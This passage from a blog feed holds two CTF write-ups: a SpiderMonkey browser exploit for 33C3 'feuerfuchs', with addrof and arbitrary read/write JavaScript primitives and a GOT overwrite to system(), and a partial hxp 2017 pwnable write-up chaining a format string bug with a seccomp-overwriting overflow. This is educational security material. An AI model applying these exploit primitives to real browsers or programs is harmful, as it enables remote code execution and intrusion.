            &lt;span class=&quot;c1&quot;&gt;// Set data pointer of |inner|&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;outer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;RShift1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// Uint8Array's cache the data pointer of the underlying ArrayBuffer&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;innerView&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;innerView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;readPointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;addrof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// To leak the address of |obj|, we set it as property of the |inner|&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// ArrayBuffer, then leak that using the existing read() method.&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;leakMe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addressOfSlotsArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;readPointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addressOfInnerArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromJSValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addressOfSlotsArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;memory&lt;/code&gt; object handles all of the memory read/write operation. For arbitrary read/write, it will first use the &lt;code class=&quot;highlighter-rouge&quot;&gt;outer&lt;/code&gt; object to modify pointer in the &lt;code class=&quot;highlighter-rouge&quot;&gt;inner&lt;/code&gt; object, then use &lt;code class=&quot;highlighter-rouge&quot;&gt;inner&lt;/code&gt; object to read/write data.&lt;/p&gt;

&lt;p&gt;Note that &lt;code class=&quot;highlighter-rouge&quot;&gt;addrof&lt;/code&gt; function is for leaking an object’s address ( like &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt; in the C language ). Here it uses a very clever method: &lt;strong&gt;By exploiting the &lt;code class=&quot;highlighter-rouge&quot;&gt;slots_&lt;/code&gt; member.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;slots_&lt;/code&gt; member is used for storing the info of an object’s properties. Before storing the &lt;code class=&quot;highlighter-rouge&quot;&gt;leakMe&lt;/code&gt; property, there’s nothing in &lt;code class=&quot;highlighter-rouge&quot;&gt;inner&lt;/code&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;slots_&lt;/code&gt; member:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  tel 0x7ffff7ebc4c0
0x00007ffff7ebc4c0│+0x00: 0x00007ffff7eb90d0  &amp;lt;-- group_
0x00007ffff7ebc4c8│+0x08: 0x00007ffff7eb73d0  &amp;lt;-- shape_
0x00007ffff7ebc4d0│+0x10: 0x0000000000000000  &amp;lt;-- slots_ ( empty )
0x00007ffff7ebc4d8│+0x18: 0x00000000013c7b70  &amp;lt;-- elements_
.........
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After storing the &lt;code class=&quot;highlighter-rouge&quot;&gt;leakMe&lt;/code&gt; property, the &lt;code class=&quot;highlighter-rouge&quot;&gt;slots_&lt;/code&gt; member become an address which points to the object’s address:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  tel 0x7ffff7ebc4c0
0x00007ffff7ebc4c0│+0x00: 0x00007ffff7eb90d0  &amp;lt;-- group_
0x00007ffff7ebc4c8│+0x08: 0x00007ffff7eb73d0  &amp;lt;-- shape_
0x00007ffff7ebc4d0│+0x10: 0x00007ffff69af940  →  0xfffe7ffff7eac700
0x00007ffff7ebc4d8│+0x18: 0x00000000013c7b70  &amp;lt;-- elements_
................
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here in this case, the exploit leak the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;Math.max&lt;/code&gt; function object, so here &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff7eac700&lt;/code&gt; points to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Math.max&lt;/code&gt; function object:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/max_func.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The rest of the exploit can be summed up as the following steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;First leak the function address of &lt;code class=&quot;highlighter-rouge&quot;&gt;Math.max&lt;/code&gt; ( which lies in &lt;code class=&quot;highlighter-rouge&quot;&gt;libxul.so&lt;/code&gt; ), and calculate the base address of &lt;code class=&quot;highlighter-rouge&quot;&gt;libxul.so&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Leak &lt;code class=&quot;highlighter-rouge&quot;&gt;memmove&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;sscanf&lt;/code&gt;’s GOT in &lt;code class=&quot;highlighter-rouge&quot;&gt;libxul.so&lt;/code&gt;, and calculate &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;’s address.&lt;/li&gt;
  &lt;li&gt;Create a TypedArray &lt;code class=&quot;highlighter-rouge&quot;&gt;target&lt;/code&gt; and write the command we want to execute into that TypedArray.&lt;/li&gt;
  &lt;li&gt;Overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;memmove&lt;/code&gt;’s GOT in &lt;code class=&quot;highlighter-rouge&quot;&gt;libxul.so&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;’s address.&lt;/li&gt;
  &lt;li&gt;Call &lt;code class=&quot;highlighter-rouge&quot;&gt;target.copyWithin(0, 1);&lt;/code&gt;. This will eventually call &lt;code class=&quot;highlighter-rouge&quot;&gt;memmove(&quot;our_command&quot;)&lt;/code&gt;, which will now be &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;our_command&quot;)&lt;/code&gt;, making us able to achieve RCE.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;summarize&quot;&gt;Summarize&lt;/h2&gt;

&lt;p&gt;With the ability to set the &lt;code class=&quot;highlighter-rouge&quot;&gt;offset&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;length&lt;/code&gt; property of a &lt;code class=&quot;highlighter-rouge&quot;&gt;TypedArray&lt;/code&gt;, we exploit the &lt;code class=&quot;highlighter-rouge&quot;&gt;valueOf&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;copyWithin&lt;/code&gt; functions, so when the Javascript engine tries to convert an object into an integer, it will modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;offset&lt;/code&gt; property and achieve OOB access during the &lt;code class=&quot;highlighter-rouge&quot;&gt;memmove&lt;/code&gt; operation.&lt;/p&gt;

&lt;p&gt;We then leak &amp;amp; calculate the “address of &lt;code class=&quot;highlighter-rouge&quot;&gt;buffers[79]&lt;/code&gt;”, and overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;buffers[80]&lt;/code&gt;’s data pointer with its value, so we can have an arbitrary read/write primitive.&lt;/p&gt;

&lt;p&gt;After that we leak the function and GOT’s address, overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;memmove&lt;/code&gt;’s GOT in &lt;code class=&quot;highlighter-rouge&quot;&gt;libxul.so&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;’s address, then call &lt;code class=&quot;highlighter-rouge&quot;&gt;copyWithin&lt;/code&gt; to trigger &lt;code class=&quot;highlighter-rouge&quot;&gt;memmove&lt;/code&gt; and execute our own command.&lt;/p&gt;

&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;

&lt;p&gt;To me browser exploitation is a whole new area. I spent almost a month to study the whole stuff, and I certainly still have a lot more to learn.&lt;/p&gt;

&lt;p&gt;For my next browser CTF challenge I would like to try &lt;a href=&quot;https://ctftime.org/task/4088&quot;&gt;Chakrazy&lt;/a&gt;, a challenge based on Microsoft’s Chakra Javascript engine. Hope I’ll be able to solve it and post another write-up :) .&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/saelo/feuerfuchs&quot;&gt;feuerfuchs challenge on github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.phrack.org/papers/attacking_javascript_engines.html&quot;&gt;Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey/Hacking_Tips&quot;&gt;SpiderMonkey hacking tips&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://wiki.mozilla.org/JavaScript:New_to_SpiderMonkey&quot;&gt;JavaScript:New to SpiderMonkey&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/mozilla/gecko-dev/blob/c64d600a96280475b6306a3b1ff933431c572784/js/src/builtin/TypedArray.js#L156&quot;&gt;SpiderMonkey source code: TypedArray.js&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/mozilla/gecko-dev/blob/0bed6b5d6d35e358ac2cd3ea5b13a61935fa3d59/js/src/vm/SelfHosting.cpp#L1176&quot;&gt;SpiderMonkey source code: SelfHosting.cpp&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ricardoquesada/Spidermonkey/blob/master/js/public/Value.h&quot;&gt;SpiderMonkey source code: Value.h&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray&quot;&gt;TypedArray on MDN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/copyWithin&quot;&gt;copyWithin on MDN&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Bruce Chen</name></author><category term="33C3" /><category term="Firefox" /><category term="Browser" /><category term="SpiderMonkey" /><category term="Javascript" /><category term="CTF" /><category term="Pwnable" /><summary type="html">Introduction</summary></entry><entry><title type="html">hxp CTF 2017 – hardened_flag_store</title><link href="http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store/" rel="alternate" type="text/html" title="hxp CTF 2017 -- hardened_flag_store" /><published>2017-11-21T03:18:00+08:00</published><updated>2017-11-21T03:18:00+08:00</updated><id>http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store</id><content type="html" xml:base="http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwnable&lt;/p&gt;

&lt;p&gt;64 bit ELF with PIE, NX, FULL RELRO enabled&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The program will read a secret string from “secret.txt” and store the string address on stack. Then it will use seccomp to create a whitelist of syscalls. We can analyze the filter by using &lt;a href=&quot;https://github.com/david942j/seccomp-tools&quot;&gt;seccomp-tools&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x06 0x00 0x00 0x00000000  return KILL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So now the program are only allowed to use the following system calls: &lt;code class=&quot;highlighter-rouge&quot;&gt;exit&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;read&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;open&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;close&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After that the program will do the following ( pseudo code ) :&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_seccomp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// read user input
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;has_seccomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init_seccomp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// set up seccomp rule
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// check if input == secret_string
&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Wrong secret :/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LABEL_19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;openflag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// input == secret_string, open flag.txt and print it to stdout
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;_fprintf_chk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;-- format string vuln
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;has_seccomp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can spot a format string vulnerability @ line 19. Although the secret string’s address is stored on stack, however the output of &lt;code class=&quot;highlighter-rouge&quot;&gt;_fprintf_chk&lt;/code&gt; is set to stderr, so we can’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;%s&lt;/code&gt; to leak the secret string.&lt;/p&gt;

&lt;p&gt;But there’s still one way to bypass the check. At line 16:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LABEL_19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;openflag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// input == secret_string, open flag.txt and print it to stdout
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we can overwrite the first character of the secret string to a null byte, and input a random string, both &lt;code class=&quot;highlighter-rouge&quot;&gt;strlen(secret_string)&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt; will be &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, thus bypass the check and will print out the flag.&lt;/p&gt;

&lt;p&gt;However this will require us to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; format string payload – which in this case will be blocked by the seccomp filter:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./flag_store
%n
Wrong secret :/
[1]    5295 invalid system call  ./flag_store
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Fortunately my teammate found that there’s a buffer overflow vulnerability while reading the user input. We can input at most 96 chars to the buffer, while its size is only 32. Moreover, this make us able to overwrite the seccomp rule ! So then we overwrite the seccomp rule with a bunch of null bytes and send the &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; character:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Sending null bytes
[*] Sending fmt payload
[*] Switching to interactive mode
Wrong secret :/
Wrong secret :/
*** %n in writable segment detected ***
[*] Got EOF while reading in interactive
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

